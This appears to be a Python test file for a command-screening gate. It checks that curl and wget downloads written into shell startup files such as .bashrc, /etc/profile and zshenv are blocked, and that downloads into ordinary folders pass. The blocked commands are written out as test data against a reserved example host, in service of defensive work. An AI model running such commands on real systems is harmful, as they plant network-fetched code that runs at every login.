"""A download saved with a folder option (curl --output-dir, wget -P, curl --create-dirs) into a startup file.
Mirrors packages/zn-gate/test/destructive_download_dirs.test.js. Only example paths and reserved hosts; nothing is run."""
import time

import pytest

from zn_gate.destructive import check_command


def rule(cmd):
    r = check_command(cmd)
    return str(r.rule).replace("destructive:", "") if r.verdict == "block" else "allow"


@pytest.mark.parametrize(
    "cmd",
    [
        "curl --output-dir ../etc -O https://example.test/profile",
        "wget -P ../etc https://example.test/zshenv",
        "wget -P../etc https://example.test/zshenv",
        "wget --directory-prefix=../etc https://example.test/profile",
        "wget --directory-prefix /etc/profile.d https://example.test/x.sh",
        "curl --create-dirs -o ../etc/profile https://example.test/p",
        "curl --output-dir=~ -o .bashrc https://example.test/x",
        "curl --output-dir ~ -o .bashrc https://example.test/x",
        "curl -o /etc/zshenv https://example.test/z",
        "wget -O /etc/zprofile https://example.test/z",
    ],
)
def test_folder_option_reaching_a_startup_file_is_refused(cmd):
    assert rule(cmd) == "rc_download"


@pytest.mark.parametrize(
    "cmd",
    [
        "curl --output-dir ./downloads -O https://example.test/f",
        "wget -P out https://example.test/f",
        "wget -P ../build https://example.test/f",
        "curl --create-dirs -o ../build/out.bin https://example.test/f",
        "curl --create-dirs -o out/f https://example.test/f",
        "curl --output-dir ./d -o profile https://example.test/f",
    ],
)
def test_folder_option_on_an_ordinary_folder_is_allowed(cmd):
    assert rule(cmd) == "allow"


def test_many_words_stay_quick():
    cmd = "wget " + "-P x " * 5000 + "https://example.test/f"
    t = time.time()
    rule(cmd)
    assert time.time() - t < 2
